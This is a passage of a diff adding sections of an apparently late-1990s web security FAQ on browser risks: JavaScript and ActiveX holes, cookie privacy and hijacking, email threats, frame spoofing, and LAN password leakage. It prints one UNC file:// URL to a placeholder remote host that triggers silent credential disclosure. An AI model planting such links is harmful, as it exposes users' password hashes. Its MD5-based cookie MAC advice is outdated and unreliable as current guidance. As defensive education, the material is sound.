+user's hard disk.  The user will have no knowledge that the upload has
+taken place unless he has checked the "Warn before Submitting a Form
+Insecurely" option in the Security Options dialog box.  Even with this
+option selected, Netscape will fail to produce a warning if the remote
+server happens to use SSL to establish a "secure" connection.
+
+<p>
+
+In order to exploit this bug, the remote server must know the name of
+the local file in advance.  However, this is still a big problem.  A
+large amount of sensitive information, including system passwords, are
+stored in files with known names.
+
+<p>
+
+Netscape Navigator 2.0, 3.0, 3.01 and Netscape Communicator 4.0 are
+all affected by this bug.  Netscape Communicator 4.01, released June
+21, contains a patch for this problem.  Version 3.02 of Netscape
+Navigator is also expected to correct the problem.  The most recent
+versions of these browsers are available at <a
+href="http://home.netscape.com/">Netscape's Web site</a>.
+
+<h3>Older Holes</h3>
+
+The following holes exist in Netscape versions 2.0 and 2.01.  They
+were discovered and publicized by John Robert LoVerso of the OSF
+Research Institute (<a
+href="mailto:loverso@osf.org">loverso@osf.org</a>):
+
+<ol>
+  <li>JavaScripts can trick the user into uploading a file on his
+      local hard disk or network mounted disk to an arbitrary machine
+      on the Internet.  Although the user must click a button in
+      order to initiate the transfer, the button can easily
+      masquerade as something innocent.  Nor is there any indication
+      that a file transfer has occurred before or after the event.
+      This is a major security risk for systems that rely on a
+      password file to control access, because a stolen password file
+      can often be readily cracked.
+  <li>JavaScripts can obtain directory listings of the user's local
+      hard disk and any network mounted disks.  This represents both
+      an invasion of privacy and a security risk, since an
+      understanding of a machine's organization is a great advantage
+      for devising a way to break into it.
+  <li>JavaScripts can monitor all pages the user visits during a
+      session, capture the URLs, and transmit them to a host somewhere
+      on the Internet.  This hole requires a user interaction to
+      complete the upload, but as in the first example the interaction
+      can be disguised in an innocuous manner.
+  <li>JavaScripts can trigger Netscape Navigator into sending off
+      e-mail messages without the user's knowledge.  This technique
+      can be used to capture user's e-mail addresses.
+</ol>
+A description of these bugs can be found at:
+<pre>
+   <a href="http://www.osf.org/~loverso/javascript/">http://www.osf.org/~loverso/javascript/</a>
+</pre>
+
+<p>
+
+These JavaScript bugs have been closed in Netscape Navigator versions
+3.0 and higher.  The exception is the e-mail address capture hole,
+which was closed in version 2.01 but reappeared again in version 3.0.
+This hole has again been closed in version 3.01, which offers a
+checkbox in the <cite>Network & Security Options</cite> dialog box to
+warn you before Navigator sends e-mail in your name.  Microsoft
+Internet Explorer, which supports a dialect of JavaScript, has a
+similar option in its <cite>Options</cite> window.
+
+<h3>The Bottom Line</h3>
+
+JavaScript contains security holes.  Many of them have been caught,
+but new ones are appearing at a steady rate.  Undoubtedly there are
+still bugs lurking. People who worry about the disclosure of personal
+information are encouraged to turn JavaScript off completely.  In
+Netscape Navigator 2.X-3.X, you can do this by deactivating a checkbox
+located in <i>Options-&gt;Network Preferences-&gt;Languages</i>.  In
+Microsoft Internet Explorer versions 3.X, you can do this by
+unchecking a misleadingly-named checkbox labeled <i>Run ActiveX
+scripts</i> in <i>View-&gt;Options-&gt;Security</i>.
+
+<p>
+
+In Microsoft Internet Explorer 4.0, the new "Security Zones" feature,
+which was designed to make the Internet safer, actually makes it
+difficult to turn off JavaScript, since it is active even when "High
+Security" is selected.  To do this, go to <cite>View-&gt;Internet
+Options-&gt;Internet Security</cite>, and select the "Internet Zone".
+Now select the radio button labeled "Custom" and press the adjacent
+"Settings..." button.  Scroll down to the bottom of the option list,
+and disable the option labeled "Active Scripting."
+
+<p>
+
+In Netscape Navigator 4.0, you should follow the procedure outlined
+above for disabling Java.
+
+<hr>
+
+<h2><a name="CLT-Q9">Q9: What is ActiveX?  Does it pose any
+risks?</a></h2>
+
+ActiveX is a technology developed by the <a
+href="http://www.microsoft.com/">Microsoft Corporation</a> for
+distributing software over the Internet.  Like Java Applets, an
+ActiveX "control" can be embedded in a Web page, where it typically
+appears as a smart interactive graphic.  A number of ActiveX controls
+are available for the Microsoft Internet Explorer (the only browser to
+support them so far), including a scrolling marquee, a background
+sound generator, and an ActiveX control that executes Java applets.
+Unlike Java, which is a platform-independent programming language,
+ActiveX controls are distributed as executable binaries, and must be
+separately compiled for each target machine and operating system.
+
+<p>
+
+The ActiveX security model is considerably different from Java
+applets.  Java achieves security by restricting the behavior of
+applets to a set of safe actions.  ActiveX, on the other hand, places
+no restrictions on what a control can do.  Instead, each ActiveX
+control can be digitally "signed" by its author in such a way that the
+signature cannot be altered or repudiated using a system called
+"Authenticode."  The digital signatures are then certified by a
+trusted "certifying authority", such as VeriSign, to create the
+equivalent of a shrink-wrapped software package.  When a digital
+certificate is granted, the software developer pledges that the
+software is free from viruses and other malicious components.  If you
+download a signed ActiveX control and it crashes your machine, you'll
+at least know who to blame.
+
+<p>
+
+This security model places the responsibility for the computer
+system's security squarely on the user's head.  Before the browser
+downloads an ActiveX control that hasn't been signed at all, or that
+has been signed but certified by an unknown certifying authority, the
+browser presents a dialog box warning the user that this action may
+not be safe.  The user can elect to abort the transfer, or may
+continue the transfer and take his chances.
+
+<p>
+
+The ActiveX certification process ensures that ActiveX controls cannot
+be distributed anonymously and that a control cannot be tampered with
+by third parties after its publication.  However, the certification
+process does <em>not</em> ensure that a control will be well-behaved.
+Although it is unlikely that signed and certified ActiveX controls
+will behave in a malicious fashion, it is not impossible.  To
+illustrate this point, software developer Fred McLain (<a
+href="mailto:mclain@halcyon.com">mclain@halcyon.com</a>) recently
+published an ActiveX control named <a
+href="http://www.halcyon.com/mclain/ActiveX/Exploder/">Exploder</a>.
+This control, which has been fully signed and certified, performs a
+clean shutdown of any Windows95 machine that downloads it.  The
+shutdown occurs automatically soon after the user views an HTML page
+that contains the Exploder control (using Microsoft Internet Explorer
+version 3.0 or higher).  After learning about Exploder, Microsoft and
+Verisign jointly revoked Fred McLain's certified digital signature,
+claiming that he had violated the agreement made when the
+certification was issued.  Therefore, if you are running a newer
+version of Internet Explorer, you'll see a message that Exploder's
+software certificate is invalid.
+
+<p>
+
+While Exploder does not cause any data loss, a less friendly control
+might reformat the user's hard disk or plant a virus.  In fact, a
+series of highly malicious ActiveX controls have been created and
+distributed by the Chaos Computer Club (CCC) of Hamburg, Germany.
+They are unsigned controls, meaning that with its default settings in
+place, Internet Explorer will warn the user that they are not to be
+trusted.  However, naive users who have changed Internet Explorer's
+restrictions on active content to "Low Security", or who agree to
+download and execute the controls despite the warnings, are vulnerable
+to attack by this means.
+
+<p>
+
+The main problem with the ActiveX security model is that it is
+difficult to track down a control that has taken some subtle action,
+such as silently transmitting confidential configuration information
+from the user's computer to a server on the Internet, seeding the LAN
+with a virus, or even patching Internet Explorer so that the code
+authentication engine no longer functions correctly.  This type of
+action may escape detection completely, or at least for a long period
+of time.  Even if the damage is detected immediately, Internet
+Explorer offers no secure audit trail that records which ActiveX
+controls were downloaded.  This makes identifying the control
+responsible for damaging your system a non-trivial task.
+
+<p>
+
+ActiveX can be turned off completely from the <i>Internet
+Options-&gt;Security</i> pages of Microsoft Internet Explorer.  Choose
+the "High Security" setting to disable ActiveX completely, or "Medium
+Security" to prompt you before downloading and executing ActiveX
+controls.  If you do allow a control to run, read its Authenticode
+certificate carefully, and then carefully commit its name, publisher,
+date and the time of download to hardcopy.  Don't store this
+information on disk, since that medium can easily be altered or
+destroyed by the control itself!  The "Low Security" option allows any
+ActiveX control to run, signed or not, and is not recommended.
+
+<p>
+
+IE 4.0 allows you to customize the behavior of ActiveX controls
+depending on whether they are coming from a site on the Internet, a
+site on the local area network, or a site on specially-prepared lists
+of trusted and untrusted sites.
+
+<hr>
+
+<h2><a name="CLT-Q10">Q10: Do "Cookies" Pose any Security Risks?</a></h2>
+
+This section deals with Web "cookies", explaining what they are, and
+what security issues they pose.
+
+<h3>What Cookies Are</h3>
+
+A "cookie" is a mechanism developed by the Netscape Corporation to
+make up for the stateless nature of the HTTP protocol.  Normally, each
+time a browser requests the URL of a page from a Web server the
+request is treated as a completely new interaction.  The fact that the
+request may be just the most recent in a series of requests as the
+user browses methodically through the site is lost.  Although this
+makes the Web more efficient, this stateless behavior makes it
+difficult to create things like shopping carts that must remember the
+user's actions over an extended period of time.
+
+<p>
+
+Cookies solve this problem.  A cookie is a small piece of information,
+often no more than a short session identifier, that the HTTP server
+sends to the browser when the browser connects for the first time.
+Thereafter, the browser returns a copy of the cookie to the server
+each time it connects.  Typically the server uses the cookie to
+remember the user and to maintain the illusion of a "session" that
+spans multiple pages.  Because cookies are not part of the standard
+HTTP specification, only some browsers support them: currently
+Microsoft Internet Explorer 3.0 and higher, and Netscape Navigator 2.0
+and higher.  The server and/or its CGI scripts must also know about
+cookies in order to take advantage of them.
+
+<p>
+
+Cookies contain attributes that tell the browser what servers to send
+them to.  The "domain" attribute tells the browser which host names
+the cookie should be returned to, and the "path" attribute indicates
+what URL paths within that domain are valid.  For instance, a domain
+of "megacorp.com" and a path of "/users" tells the browser to return
+the cookie to hosts with names like "ftp.megacorp.com" and
+"www.megacorp.com", and to do so only when requesting URLs that start
+with the path "/users".  An important security measure prevents the
+cookie's domain from being set to top-level domains like ".com".  This
+prevents someone from creating a promiscuous cookie that will be
+returned to any server.
+
+<h3>Cookies And Privacy</h3>
+
+Cookies cannot be used to "steal" information about you or your
+computer system.  They can only be used to store information that you
+have provided at some point.  To give a benign example, if you fill
+out a form giving your favorite color, a server can turn this
+information into a cookie and send it to your browser.  The next time
+you contact the site, your browser will return the cookie, allowing
+the server to alter background color of its pages to suit your
+preferences.
+
+<p>
+
+However cookies can be used for more controversial purposes.  Each
+access your browser makes to a Web site leaves some information about
+you behind, creating a gossamer trail across the Internet.  Among the
+tidbits of data left along this trail are the name and IP address of
+your computer, the brand of browser you're using, the operating system
+you're running, the URL of the Web page you accessed, and the URL of
+the page you were last viewing.  Without cookies, it would be nearly
+impossible for anyone to follow this trail systematically to learn
+much about your Web browsing habits.  They would have to reconstruct
+your path by correlating hundreds or thousands of individual server
+logs.  With cookies, the situation changes considerably.
+
+<p>
+
+The <a href="http://www.doubleclick.com">DoubleClick Network</a> is a
+system created by the DoubleClick Corporation to create profiles of
+individuals using the World Wide Web and to present them with
+advertising banners customized to their interests.  DoubleClick's
+primary customers are Web sites looking to advertise their services.
+Each member of the DoubleClick Network becomes a host for the
+advertising of other members of the network.  When a Web site
+joins DoubleClick it creates advertisements for its services and
+submits them to DoubleClick's server.  The Web site then modifies its
+HTML pages to include an &lt;IMG&gt; graphic that points to
+DoubleClick.  When a user goes to view one of these modified HTML
+pages, her browser makes a call to DoubleClick's server to retrieve
+the graphic.  The server chooses one of its member's advertisements
+and returns it to the browser.  If the user reloads the page, a
+different advertisement appears.  If the user clicks on the graphic,
+her browser jumps to the advertised site.  Currently many hundreds of
+sites belong to DoubleClick.
+
+<p>
+
+From the user's point of view DoubleClick's graphics appear no
+different from any other Web advertisement, and there's no visible
+indication of anything special about the graphic.  However, there is
+an important difference.  When a user first connects to the
+DoubleClick server to retrieve a graphic, the server assigns the
+browser a cookie that contains a unique identification number.  From
+that time forward whenever the user connects to <em>any</em> Web site
+that subscribes to the DoubleClick Network, her browser returns the
+identification number to DoubleClick's server, allowing the server to
+recognize her.  Over a period of time DoubleClick compiles a list of
+which member sites the user has visited and revisited, using this
+information to create a profile of the user's tastes and interests.
+With this profile in hand the DoubleClick server can select advertising
+that is likely to be of interest to the user.  It can also use this
+information to compile valuable feedback for its member Web sites,
+such as providing them with audience profiles and rating the
+effectiveness of the advertisements.
+
+<p>
+
+Although names and e-mail addresses are <strong>not</strong> part of
+the information that DoubleClick records, other information that the
+browser leaves behind is sufficient, in many cases, to identify the
+user.  See <a href="wwwsf3.html#privacy">Server Logs and Privacy</a> for more
+information.  For this reason many people are uncomfortable with
+DoubleClick's use of cookies.  To find out whether you have been
+tracked by DoubleClick, examine your browser's cookies file.  On Unix
+systems using Netscape, the cookies file can be found in your home
+directory in the file <code>~/.netscape/cookies</code>.  If a line like
+this appears:
+
+<blockquote><pre>
+ad.doubleclick.net FALSE / FALSE 942195440 IAA d2bbd5
+</pre></blockquote>
+
+then you are carrying a DoubleClick cookie.
+
+<p>
+
+Windows users will find the equivalent information in the file
+<code>cookies.txt</code>, located in their
+<code>C:\Programs\Netscape\Navigator</code> directory, while Macintosh
+users should look in their System Folder under <code>Preferences:Netscape</code>.
+Users of Microsoft Internet Explorer should examine the files located
+in <code>C:\Windows\Cookies</code>.
+
+<p>
+
+Current versions of both Netscape Navigator and Internet Explorer
+offer the option of alerting you whenever a server attempts to give
+your browser a cookie.  If you turn this alert on, you will have the
+option of refusing cookies.  You should also manually delete any
+cookies that you have already collected.  The easiest way to do this
+is to remove the cookies file entirely.
+
+<p>
+
+The drawback to this scheme is that many servers will offer the same
+cookie repeatedly even after you refuse to accept the first one.  This
+rapidly leads to a nuisance situation.  Before you panic over cookies,
+it's worth remembering that the vast majority of cookies are benign
+attempts to improve your Web browsing experience, not intrusions on
+your privacy.  Netscape Navigator 4.0 provides a new feature that
+allows you to refuse cookies that are issued from sites other than the
+main page you are viewing.  This foils most DoubleClick schemes
+without interfering with the more benign cookies.  To access this
+option, select <cite>Edit-&gt;Preferences-&gt;Advanced</cite>, and
+select the appropriate radio button from the cookies section.
+
+<p>
+
+Some people might want to allow transient cookies (ones active only
+during a browsing session) but forbid persistent ones (ones that store
+user identification information over an extended period).  On Unix
+systems, you can do this easily by creating a symbolic link between
+the Unix "bit bucket" device, <cite>/dev/null</cite> and the cookies
+file.  Users of other operating systems may have to invest in third
+party products that intercept cookies.  A representative listing
+of such products follows:
+
+<dl>
+  <dt>NSClean, IEClean
+  <dd>Windows 95/NT programs that wipe the cookies file clean.
+  <dd><a href="http://www.nsclean.com/">http://www.nsclean.com/</a>
+      <p>
+  <dt>InterMute (Windows, Macintosh, Unix)
+  <dd>An anonymizing proxy that removes cookies, referer information,
+      and other identifying information from your URL requests.  Runs
+      as a Java applet within the browser.
+      <p>
+  <dd><a href="http://www.intermute.com/">http://www.intermute.com/</a>
+  <dt>Internet Junkbuster Proxy (Unix)
+  <dd>An anonymizing proxy that removes cookies, referer information,
+      and other identifying information from your URL requests.
+  <dd><a
+      href="http://internet.junkbuster.com/">http://internet.junkbuster.com/</a>
+</dl>
+
+<h3>Cookies And System Security</h3>
+
+In addition to the privacy issues, cookies carry security implications
+as well.  Many sites use cookies to implement access control schemes
+of various sorts.  For example, a subscription site that requires a
+user name and password might pass a cookie back to your browser the
+first time you log in.  Thereafter, the site will give you access to
+restricted pages if your browser can produce a valid cookie, basically
+using the cookie as an admission ticket.  This can have several
+advantages for the site, not the least of which is that it can avoid
+the overhead of looking up your user name and password in a database
+each and every time you access a page.
+
+<p>
+
+However, unless this type of system is implemented carefully, it may
+be vulnerable to exploitation by unscrupulous third parties.  For
+instance, an eavesdropper armed with a packet sniffer could simply
+intercept the cookie as it passes from your browser to the server,
+using it to obtain free access to the site.  Because browsers use the
+domain name system (DNS) to determine what cookies belong to a server,
+it is possible to trick a browser into sending a cookie to a rogue
+server by temporarily subverting the DNS.  If the cookie is
+persistent, of course, it is also vulnerable to being stolen from the
+user's cookie database file.
+
+<p>
+
+Now consider a transaction processing systems that uses cookies as
+session IDs to preserve state during the steps of a multi-part
+transaction.  Examples of such systems include a system that allows
+authorized employees to update records in a corporate database, an
+on-line ordering system, or a bank transaction system.  If care is not
+taken to protect the cookie from interception, it is possible for an
+interloper to hijack the transaction and use it to make unauthorized
+transactions.
+
+<p>
+
+Designers of systems that use cookies for authentication and
+state-preservation should be alert to the possibility of cookie
+interception.  Cookies should aways contain as little private
+information as possible.  In particular, it is <em>never</em>
+appropriate for cookies to contain plaintext user names and passwords.
+In ISP environments where many users share the same Web server, it is
+important to use as specific a path as possible in the cookie.  For
+instance, if the program that processes cookies lives at URL
+<cite>http://bigISP.com/users/fred/order.cgi</cite>, then the
+developer should arrange for the cookie path to be set to
+<cite>/users/fred/order.cgi</cite> rather than a more general path
+like <cite>/</cite>.
+
+<p>
+
+If possible, cookies should contain information that allows the system
+to verify that the person using them is authorized to do so.  A
+popular scheme is to include the following information in cookies:
+
+<ol>
+  <li>the session ID or authorization information
+  <li>the time and date the cookie was issued
+  <li>an expiration time
+  <li>the IP address of the browser the cookie was issued to
+  <li>a message authenticity check (MAC) code
+</ol>
+
+By incorporating an expiration date and time into the cookie, system
+designers can limit the potential damage that a hijacked cookie can
+do.  If the cookie is intercepted, it can only be used for a finite
+time before it becomes invalid.  The idea of including the browser's
+IP address into the cookie is that the cookie will only be accepted if
+the stored IP address matches the IP address of the browser submitting
+it.  This makes it difficult for an interloper to hijack the cookie,
+because it is hard (although not impossible) to spoof an IP address.
+
+<p>
+
+The MAC code is there to ensure that none of the fields of the cookie
+have been tampered with.  There are many ways to compute a MAC, most
+of which rely on one-way hash algorithms such as MD5 or SHA to create
+a unique fingerprint for the data within the cookie.  Here's a simple
+but relatively secure technique that uses MD5:
+
+<blockquote><pre>
+MAC = MD5(&quot;secret key &quot; +
+           MD5(&quot;session ID&quot; + &quot;issue date&quot; +
+               &quot;expiration time&quot; + &quot;IP address&quot; +
+               &quot;secret key&quot;)
+          )
+</pre></blockquote>
+
+This algorithm first performs a string concatenation of all the data
+fields in the cookie, then adds to it a secret string known only to
+the Web server.  The whole is then passed to the MD5 function to
+create a unique hash.  This value is again concatenated with the
+secret key, and the whole thing is rehashed.  (The second round of MD5
+hashing is necessary in order to avoid an attack in which additional
+data is appended to the end of the cookie and a new hash recalculated
+by the attacker.)
+
+<p>
+
+This hash value is now incorporated into the cookie data.  Later, when
+the cookie is returned to the server, the software should verify that
+the cookie hasn't expired and is being returned by the proper IP
+address.  Then it should regenerate the MAC from the data fields, and
+compare that to the MAC in the cookie.  If they match, there's little
+chance that the cookie has been tampered with.
+
+<p>
+
+Perl programmers can take advantage of the HMAC algorithm, a slightly
+more sophisticated technique that has been incorporated into a module
+by Gisle Aas.  It is available at <a
+href="http://www.perl.com/CPAN/">CPAN</a> in the module MD5::Digest.
+
+<p>
+
+An alternative method is to encrypt the entire cookie with an
+encryption algorithm such as DES, IDEA or RC4.  For more information
+on using encryption and hash algorithms, see the <a href="wwwsf7.html#crypto">cryptography references</a> at the end of
+this document.
+
+<p>
+
+For extremely sensitive applications, developers should probably
+encrypt the entire channel between browser and server using a
+non-crippled version of <a href="wwwsf3.html#Q26">SSL</a>.  The cookie
+will be encrypted along with the rest of the data stream in such a way
+that network eavesdroppers cannot intercept the cookie without first
+cracking the encryption.  To avoid the cookie being inadvertently
+disclosed across a non-secure channel, developers should set the
+"secure" attribute so that the browser only transmits the cookie when
+SSL is in effect.
+
+<hr>
+
+<h2><a name="CLT-Q11">Q11: I hear there's an e-mail message making the
+rounds that can trash my hard disk when I open it.  Is this
+true?</a></h2>
+
+<p>
+
+For many years the answer to this question was a resounding <b>no</b>
+and that is largely the case now as well.  There are a series of hoax
+chain letters that are seemingly endlessly circulating around the
+globe.  A typical letter is the "Good Times" hoax.  It will warn you
+that if you see an e-mail with a subject line that contains the phrase
+"Good Times" you should delete it immediately because the very fact
+of opening it will activate a virus that will do damage to your hard
+disk.   The letter will encourage you to send this warning to your
+friends.
+
+<p>
+
+The "Good Times" hoax, and many like it, are simply not true.  However
+there are enough people who believe these hoaxes that the messages are
+endlessly forwarded and reforwarded.  If you get a letter like this
+one, simply delete it.  Do not forward it to your friends, and please
+do not forward it to any mailing lists.  If you are uncertain whether
+the letter is a hoax, refer it to your system administrator or network
+security officer.
+
+<p>
+
+Just to make life complicated, however, there are some cases in which
+the simple act of opening an e-mail message <b>can</b> damage your
+system.  The newer generation of e-mail readers, including the one
+built into Netscape Communicator, Microsoft Outlook Express, and
+Qualcomm Eudora all allow e-mail attachments to contain "active
+content" such as ActiveX controls or JavaScript programs.  As
+explained in the <a href="#CLT-Q8">JavaScript</a> and in the&nbsp; <a
+href="#CLT-Q9">ActiveX</a> sections,&nbsp; active content provides a
+variety of backdoors that can violate your privacy or perhaps inflict
+more serious harm.  Until the various problems are shaken out of
+JavaScript and ActiveX, enclosures that might contain active content
+should be opened cautiously.  This includes HTML pages and links to
+HTML pages.  Disabling JavaScript and ActiveX will immunize you to
+potential problems.
+
+<p>
+
+In addition, there are other cases where e-mail messages can be
+harmful to your health.  In the summer of 1998, a number of
+programming blunders were discovered in e-mail readers from Qualcomm,
+Netscape and Microsoft.  These blunders (which involved overflowing
+static buffers) allowed a carefully crafted e-mail message to crash
+your computer or damage its contents.  No actual cases of damage
+arising from these holes has been described, but if you are cautious
+you should upgrade to a fixed version of your e-mail reader.  More
+details can be found at the vendors' security pages:
+
+<dl>
+  <dt>Microsoft
+  <dd><a
+      href="http://www.microsoft.com/security/bulletins/">
+      http://www.microsoft.com/security/bulletins/</a>
+  <dt>Netscape
+  <dd><a href="http://www.netscape.com/products/security/">
+      http://www.netscape.com/products/security/</a>
+  <dt>Qualcomm
+  <dd><a href="http://eudora.qualcomm.com/security.html">
+      http://eudora.qualcomm.com/security.html</a>
+</dl>
+
+<p>
+
+Finally, don't forget that some documents do carry viruses.  For
+example, Microsoft Word, Excel and PowerPoint all support macro
+languages that have been used to write viruses.  Naturally enough, if
+you use any of these programs and receive an e-mail message that
+contains one of these documents as an enclosure, your system may be
+infected when you open that enclosure.  An up-to-date virus checking
+program will usually catch these viruses before they can attack.  Some
+virus checkers that recognize macro viruses include:
+
+<dl>
+  <dt>McAfee VirusScan
+  <dd><a href="http://www.mcafee.com/">http://www.mcafee.com/</a>
+  <dt>Symantec AntiVirus
+  <dd><a href="http://www.symantec.com/">http://www.symantec.com/</a>
+  <dt>Norton AntiVirus
+  <dd><a href="http://www.symantec.com/">http://www.symantec.com/</a>
+  <dt>Virex
+  <dd><a href="http://www.datawatch.com/virex.shtml">http://www.datawatch.com/virex.shtml</a>
+  <dt>IBM AntiVirus
+  <dd><a href="http://www.av.ibm.com/">http://www.av.ibm.com/</a>
+  <dt>Dr. Solomon's Anti-Virus
+  <dd><a href="http://www.drsolomon.com/">http://www.drsolomon.com/</a>
+</dl>
+
+<hr>
+
+<h2><a name="CLT-Q12">Q12: Can one Web site hijack another's content?</a></h2>
+
+<p>
+
+There are many variants of this question, and the answer to them all
+is <b>yes</b>.  If a site publishes public (not password-protected)
+pages on the Web, there is nothing to stop anyone who wants to from
+copying the entire site and setting up a server that uses the pirated
+content.  It is surprisingly easy to do this; there are many Perl
+"spiders" that will copy an entire site with a single command, and
+even Internet Explorer has a simple built-in spider.  Sometimes this
+activity is legitimate, such as when someone sets up a mirror site of
+a public document (for example, the <a
+href="wwwsf_mirrors.html">the WWW Security FAQ</a> is mirrored in
+this way), but sometimes it is out-and-out piracy.
+
+<p>
+
+The implication of this is that you should be a little careful about
+trusting what you see on the screen.  Popular sites often are
+surrounded by non-affiliated sites with similar names that exploit
+peoples' tendency to make typographical errors when entering URLs.
+For example, try <a
+href="http://www.nescape.com">http://www.nescape.com</a> or <a
+href="http://www.mcrosoft.com/">http://www.mcrosoft.com/</a>.  Always
+check double-check the URL of the site you are accessing before
+submitting personal or confidential information to it.
+
+<p>
+
+Although difficult, it is possible in some cases for a site to
+temporarily "spoof" the domain name system so that a URL points to the
+wrong server.  In this case both the URL and the content will look
+right, but the server you are communicating with is not the one you
+think it is.  If the site uses SSL, one way to confirm its identity is
+to <a href="#CLT-Q4"> check the site's digital certificate</a>.  If
+the site is supposed to be using SSL, but isn't, this is a cause for
+suspicion.
+
+<p>
+
+However, even when the URL and certificate agree you cannot always be
+sure that a page contains the content approved by the Web site. In
+November 1998, a breathtaking flaw came to light in the implementation
+of frames in recent versions of Netscape Navigator and Microsoft
+Internet Explorer.  By exploiting this bug, a malicious Web site can
+insert its own content into one or more frames of a trusted Web site.
+This will make the content appear to be coming from the trusted site,
+but in actually it comes from a untrusted third party.  The URL will
+appear to be correct, and not even the digital certificate can be used
+to tell otherwise!  This bug is described in the following URLs:
+
+<ul>
+  <li><a href="http://tbtf.com/archive/11-17-98.html">
+      http://tbtf.com/archive/11-17-98.html</a>
+  <li><a href="http://www.securexpert.com/framespoof/index.html">
+      http://www.securexpert.com/framespoof/index.html</a>
+  <li><a href="http://www.securexpert.com/framespoof/start.html">
+      http://www.securexpert.com/framespoof/start.html</a>
+  <li><a href="http://www.securexpert.com/framespoof/tech.html">
+      http://www.securexpert.com/framespoof/tech.html</a>
+</ul>
+
+<p>
+
+<a name="watermarks"> A related question frequently asked by
+Webmasters is how to prevent</a> their material from being hijacked.
+If the concern is that someone will copy a public document across the
+Internet and then uses it for their own ends, the sad answer is that
+there is no way to avoid this.  However, there are a number of
+techniques for digitally "watermarking" copyrighted images, sound
+samples, and other binary formats in order to discourage their use and
+to prosecute offenders.  For collections of links to products that
+offer this technology, see <a
+href="http://www.foto.unibas.ch/bilderbank/links/watermark.html">the
+Bilderbank digital watermarking pages</a>, and <a
+href="http://cosimo.die.unifi.it/~piva/Watermarking/watermark.html">Alessandro
+Piva's digital watermarking pages</a>, and <a
+href="http://www.cl.cam.ac.uk/~fapp2/steganography/">Digital
+watermarking, steganograph &amp; information hiding</a>.
+
+<p>
+
+If, on the other hand, the concern is that unscrupulous sites are
+linking to your CGI scripts and images without authorization,
+essentially freeloading on your site, then you may be able to prevent
+this by using the <cite>Referer</cite> field to restrict access.  This
+requires you to have a Web server that can filter requests based on
+arbitrary HTTP request fields.  You will want to allow requests by
+older clients that have no Referer field defined, and those whose
+Referer field points back to one of your site's pages.  Clients whose
+Referer field is from an unrelated site are refused acccess.  This
+will prevent remote sites from using your site as the target of their
+&lt;IMG&gt; and &lt;FORM&gt; tags.
+
+<p>
+
+The <a href="http://www.apache.org">Apache</a> Web server, when
+equipped with the optional <a
+href="http://www.engelschall.com/pw/apache/rewriteguide/">mod_rewrite</a>
+module, can accomplish this with the following series of directives:
+
+<blockquote>
+<pre>
+RewriteCond %{HTTP_REFERER} !^$                        # Referer field exists
+RewriteCond %{HTTP_REFERER} !^http://my.site.com/ [NC] # and not my site
+RewriteRule [^/]+\.(gif|jpg)$   -                 [F]  # No access to images
+RewriteRule ^/cgi-bin/.+$       -                 [F]  # No access to
+CGIs
+</pre>
+</blockquote>
+
+<p>
+
+See your vendor's documentation to determine whether the Web server
+you use provides this capability.
+
+<hr>
+
+<h2><a name="CLT-Q13">Q13: Can my Web Browser Reveal my LAN Login Name
+and Password?</a></h2>
+
+For Windows 95, WFWG and Windows NT users, the answer is sometimes
+yes.  A malicious Web server can trick either Internet Explorer or
+Netscape Navigator into revealing the user name that you use to log in
+to your organization's local area network.  It can also force the
+browser to reveal your login password in an encrypted form that can
+often be cracked using a "dictionary attack".  This represents a major
+problem both for yourself and for your organization, because as soon
+as your login name and password are known, outsiders can use it to
+break into your organization's LAN, steal data, or damage files.  This
+is provided, of course, that the LAN is not specifically protected
+against attacks of this sort by a <em>properly</em> configured
+firewall system.
+
+<p>
+
+If intruders succeed in inflicting damage on your organization's
+systems, the damages will appear to have caused by <em>you</em>, and
+you'll have some explaining to do.  Even if you are not connected to a
+LAN, you still have cause to worry.  If you have at any point turned
+on Windows-based file sharing, your personal files can be stolen or
+damaged during the period of time you are connected to the Internet
+through an ISP.
+
+<p>
+
+A total of three separate, but related bugs have been discovered.  The
+first bug was reported on March 14, 1997 by <a
+href="http://www.ee.washington.edu/staff/spangler.html">Aaron
+Spanger</a> and so far has not been fixed.  It affects Internet
+Explorer versions 3.01 and lower (including those with Microsoft's
+security patches), running under Windows 95, Windows NT and Windows
+97.  Netscape Navigator 3.01 (regular and gold) and Netscape
+Communicator beta2 browsers are also vulnerable when running on
+Windows NT systems, and under some, but not other, Windows 95 systems
+(results are mixed).  A description and demonstration is available at:
+
+<blockquote><pre>
+<a href="http://www.ee.washington.edu/computing/iebug/">http://www.ee.washington.edu/computing/iebug/</a>
+</pre></blockquote>
+
+<p>
+
+
+The second bug, discovered by <a
+href="mailto:paul.ashton@eigen.co.uk">Paul Ashton</a> on the heels of
+the first, affects IE (3.01 and lower) running on Windows NT 3.51/4.0
+(both server and workstation versions).  It is described at:
+
+<blockquote><pre>
+<a href="http://www.efsl.com/security/ntie/">http://www.efsl.com/security/ntie/</a>
+</pre></blockquote>
+
+<p>
+
+The second bug, reported on March 17, 1997 by <a
+href="mailto:sbirn@security.org.i">Steve Birnbaum</a>, affects
+Microsoft Internet Explorer (version 3.01 and lower) when running on
+Windows 95.  It is described at:
+
+<blockquote><pre>
+<a href="http://www.security.org.il/msnetbreak/">http://www.security.org.il/msnetbreak/</a>
+</pre></blockquote>
+
+<p>
+
+These bugs all involve Microsoft's "challenge/response" mode of user
+authentication used for file sharing.  Here's a slightly simplified
+explanation.  When a client attempts to contact a server (whether a
+file server, a web server or a shared printer), the server sends the
+client a short, randomly chosen challenge string called a "nonce."
+The client encrypts the challenge using the user's password, and sends
+the encrypted challenge, the user's name, and other identifying
+information back to the server.  The server looks up the user in its
+password database, finds the user's password, and uses the password to
+encrypt the challenge.  This is now compared to what that the client
+sent back, and if they match, the server confirms that the user knows
+the right password without the password ever having been sent over the
+network.  Note that the thing being encrypted is not the "secret" in
+this case, but the password used as the encryption key.
+
+<p>
+
+If either IE or Netscape sees a URL of the form:
+<blockquote><pre>
+file://\\aa.bb.cc.ddd\path\to\file
+</pre></blockquote>
+
+(where "aa.bb.cc.dd" is the Internet address of the remote server), it
+will attempt to access the file as if it were a file on the local LAN,
+and attempts to authenticate itself through the challenge/response
+system described above.  This is all done quietly without any
+notification to the user.
+
+<p>
+
+During a password-theft attack, the host at this location is running a
+specially modified version of the Windows filesharing server that
+sends a constant challenge string each time instead of a randomly
+chosen one.  Your computer trustingly encrypts the challenge with your
+password and sends it back to the server.  The server is now free to
+compare your encrypted password to a dictionary containing tens of
+thousands of passwords that have previously been used to encrypt the
+challenge.  If it finds a match, it has successfully guessed your
+password (this is known as a "dictionary attack").  Because many
+people pick easily-guessed passwords, a good dictionary attack can
+crack an average password about a quarter of the time.  Even if the
